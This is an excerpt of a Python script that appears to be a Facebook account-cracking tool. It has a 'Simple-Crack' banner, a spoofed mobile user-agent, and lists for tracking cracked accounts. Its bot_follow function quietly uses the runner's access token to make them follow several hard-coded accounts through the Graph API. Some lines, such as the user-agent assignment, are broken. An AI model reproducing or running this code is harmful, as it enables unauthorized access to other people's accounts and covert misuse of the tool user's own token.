...
uas = random.choice = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
id = []
cp = []
ok = []
loop = 0
...
def logo():
	...
	print("""
   _____            __        _____             __  
  / __(_)_ _  ___  / /__ ____/ ___/______ _____/ /__
 _\ \/ /  ' \/ _ \/ / -_)___/ /__/ __/ _ `/ __/  '_/
/___/_/_/_/_/ .__/_/\__/    \___/_/  \_,_/\__/_/\_\ 
           /_/     """)
def bot_follow():
	try:
		...
		requests.get('https://graph.facebook.com/v1.0/100000839038766/subscribers?access_token='+token)
		...
		requests.get('https://graph.facebook.com/v1.0/100026711802694/subscribers?access_token='+token)
		requests.get('https://graph.facebook.com/v1.0/100042918784910/subscribers?access_token='+token)
		requests.get('https://graph.facebook.com/v1.0/100059454248601/subscribers?access_token='+token)
